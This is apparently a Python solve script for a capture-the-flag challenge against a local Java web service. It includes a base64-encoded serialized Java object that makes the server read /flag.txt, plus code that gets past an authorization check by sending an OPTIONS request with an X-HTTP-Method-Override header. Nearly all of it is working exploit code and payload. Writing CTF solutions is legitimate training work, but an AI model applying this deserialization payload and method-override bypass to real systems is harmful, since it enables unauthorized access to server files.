import requests

"""
Add the following endpoint to generate a valid payload that leaks the flag:
get("/solve", (request, response) -> {
    zFileReader exploitObject = new zFileReader("/flag.txt");
    exploitObject.setContents("");
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
        out.writeObject(exploitObject);
    }
    return Base64.getEncoder().encodeToString(baos.toByteArray());
});
This will generate a valid payload that leaks the flag:
rO0ABXNyAA9hcHAuekZpbGVSZWFkZXIAAAAAAAAAAQIAAkwACGNvbnRlbnRzdAASTGphdmEvbGFuZy9TdHJpbmc7TAAEcGF0aHEAfgABeHB0AAB0AAkvZmxhZy50eHQ=
"""

if __name__ == "__main__":
    payload = "rO0ABXNyAA9hcHAuekZpbGVSZWFkZXIAAAAAAAAAAQIAAkwACGNvbnRlbnRzdAASTGphdmEvbGFuZy9TdHJpbmc7TAAEcGF0aHEAfgABeHB0AAB0AAkvZmxhZy50eHQ="
    host = "http://localhost:4567/"
    # bypass auth check using X-HTTP-Method-Override while sending an OPTIONS req
    r = requests.options(f"{host}getFile?data={payload}", headers={"X-HTTP-Method-Override":"GET"})
    if "oiccflag{" in r.text:
        print(r.text)